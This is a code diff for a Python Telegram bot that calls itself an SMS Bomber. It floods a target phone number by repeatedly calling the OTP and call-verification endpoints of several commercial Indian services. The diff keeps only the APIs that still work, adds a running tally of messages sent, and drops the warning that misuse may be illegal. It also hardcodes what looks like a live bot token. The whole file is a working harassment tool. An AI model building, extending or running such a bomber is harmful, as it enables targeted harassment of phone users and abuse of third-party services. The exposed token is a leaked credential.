@@ -27,43 +27,33 @@ TOKEN = "7554221154:AAF6slUuJGJ7tXuIDhEZP8LIOB5trSTz0gU"
 # Global variables
 active_attacks = {}
 stop_events = {}
+message_count = {}  # To track total messages sent
 
-# List of APIs with their respective payloads
+# List of working APIs (removed non-working ones)
 APIS = [
     {
         "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
         "payload": {"mobile": ""},
-        "headers": {"Content-Type": "application/json"}
+        "headers": {"Content-Type": "application/json"},
+        "name": "Swiggy"
     },
     {
         "url": "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call",
         "payload": {"contactNumber": "", "domainId": "2"},
-        "headers": {"Content-Type": "application/json"}
-    },
-    {
-        "url": "https://omni-api.moreretail.in/api/v1/login/",
-        "payload": {"hash_key": "XfsoCeXADQA", "phone_number": ""},
-        "headers": {"Content-Type": "application/json"}
+        "headers": {"Content-Type": "application/json"},
+        "name": "Proptiger"
     },
     {
         "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
         "payload": {"isPlaycircle": False, "mobile": "", "deviceId": "6ebd671c-a5f7-4baa-904b-89d4f898ee79", "deviceName": "", "refCode": ""},
-        "headers": {"Content-Type": "application/json"}
+        "headers": {"Content-Type": "application/json"},
+        "name": "RummyCircle"
     },
     {
         "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
         "payload": {"isPlaycircle": False, "mobile": "", "deviceId": "03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1", "deviceName": "", "refCode": ""},
-        "headers": {"Content-Type": "application/json"}
-    },
-    {
-        "url": "https://www.samsung.com/in/api/v1/sso/otp/init",
-        "payload": {"user_id": ""},
-        "headers": {"Content-Type": "application/json"}
-    },
-    {
-        "url": "https://identity.tllms.com/api/request_otp",
-        "payload": {"feature": "", "phone": "+91", "type": "sms", "app_client_id": "null"},
-        "headers": {"Content-Type": "application/json"}
+        "headers": {"Content-Type": "application/json"},
+        "name": "My11Circle"
     }
 ]
 
@@ -77,12 +67,11 @@ Hey {user.mention_markdown_v2()}\\!
 
 🚀 *Features:*
 - Send multiple SMS to a target number
-- Uses multiple APIs simultaneously
-- Repeats every 35 seconds
+- Uses {len(APIS)} working APIs
 - Stop functionality with /stop command
 
 ⚠️ *Disclaimer:*
-This bot is for *educational purposes only*\\. Misuse may violate terms of service and could be illegal in some jurisdictions\\.
+This bot is for *educational purposes only*\\. Misuse may violate terms of service\\.
 
 📌 *How to use:*
 1\\. Click 'Start Attack' button
@@ -98,8 +87,7 @@ This bot is for *educational purposes only*\\. Misuse may violate terms of servi
     
     try:
         await update.message.reply_markdown_v2(welcome_msg, reply_markup=reply_markup)
-    except BadRequest as e:
-        logger.error(f"Error sending message: {e}")
+    except BadRequest:
         await update.message.reply_text("Welcome to SMS Bomber Bot! Click the buttons below to get started.", reply_markup=reply_markup)
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -116,8 +104,7 @@ Send /stop command
 
 🔹 Current Features:
 - Multiple API support
-- Simultaneous requests
-- Repeat every 35 seconds
+- Message counter
 - Stop functionality
 
 ⚠️ Use responsibly\\!
@@ -137,8 +124,7 @@ Send /stop command
 
 Current Features:
 - Multiple API support
-- Simultaneous requests
-- Repeat every 35 seconds
+- Message counter
 - Stop functionality
 
 Use responsibly!
@@ -177,6 +163,7 @@ async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, phone
     
     stop_event = threading.Event()
     stop_events[user_id] = stop_event
+    message_count[user_id] = 0  # Initialize message counter
     
     # Create and start attack thread
     attack_thread = threading.Thread(
@@ -186,12 +173,21 @@ async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, phone
     attack_thread.start()
     
     active_attacks[user_id] = attack_thread
-    await update.message.reply_text(f"🚀 Attack started on {phone_number}!\n\n🛑 Use /stop to end the attack.")
+    
+    # Show working APIs
+    api_list = "\n".join([f"• {api['name']}" for api in APIS])
+    await update.message.reply_text(
+        f"🚀 Attack started on {phone_number}!\n\n"
+        f"📡 Working APIs:\n{api_list}\n\n"
+        f"🛑 Use /stop to end the attack."
+    )
 
 def run_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str, stop_event: threading.Event) -> None:
     """Run the attack in a separate thread."""
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
+    
+    user_id = update.effective_user.id
     
     while not stop_event.is_set():
         try:
@@ -211,15 +207,28 @@ def run_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number:
             for thread in threads:
                 thread.join()
             
-            # Send summary
+            # Update message count
             success_count = sum(1 for r in results if r['success'])
+            message_count[user_id] += success_count
+            
+            # Create progress bar
+            total_attempts = message_count[user_id]
+            progress = min(100, total_attempts // 2)  # Cap at 100%
+            progress_bar = "🟩" * progress + "⬜" * (100 - progress)
+            
+            # Send summary
+            summary = (
+                f"📊 Attack Status for {phone_number}:\n"
+                f"✅ Successful: {success_count} this round\n"
+                f"📨 Total Sent: {message_count[user_id]}\n"
+                f"📈 Progress: {progress}%\n{progress_bar}\n"
+                f"🔄 Next round in 35 seconds..."
+            )
+            
             loop.run_until_complete(
                 context.bot.send_message(
                     chat_id=update.effective_chat.id,
-                    text=f"📊 Round completed for {phone_number}:\n"
-                         f"✅ Success: {success_count}\n"
-                         f"❌ Failed: {len(results) - success_count}\n"
-                         f"🔄 Next round in 35 seconds..."
+                    text=summary
                 )
             )
             
@@ -249,10 +258,6 @@ def send_single_request(api: dict, phone_number: str, results: list) -> None:
             if "mobile" in key.lower() or "phone" in key.lower() or "number" in key.lower() or "contact" in key.lower():
                 payload[key] = phone_number
         
-        # Special case for some APIs
-        if "identity.tllms.com" in api["url"]:
-            payload["phone"] = "+91" + phone_number
-        
         # Send request
         response = requests.post(
             api["url"],
@@ -263,12 +268,14 @@ def send_single_request(api: dict, phone_number: str, results: list) -> None:
         
         results.append({
             "url": api['url'],
+            "name": api['name'],
             "success": response.status_code == 200,
             "status": response.status_code
         })
     except Exception as e:
         results.append({
             "url": api['url'],
+            "name": api['name'],
             "success": False,
             "error": str(e)
         })
@@ -287,11 +294,18 @@ async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
     # Wait for thread to finish (with timeout)
     active_attacks[user_id].join(timeout=5)
     
+    # Get final count
+    total_sent = message_count.get(user_id, 0)
+    
     # Clean up
     del active_attacks[user_id]
     del stop_events[user_id]
+    del message_count[user_id]
     
-    await update.message.reply_text("🛑 Attack stopped successfully!")
+    await update.message.reply_text(
+        f"🛑 Attack stopped successfully!\n"
+        f"📨 Total messages sent: {total_sent}"
+    )
 
 def main() -> None:
     """Start the bot."""
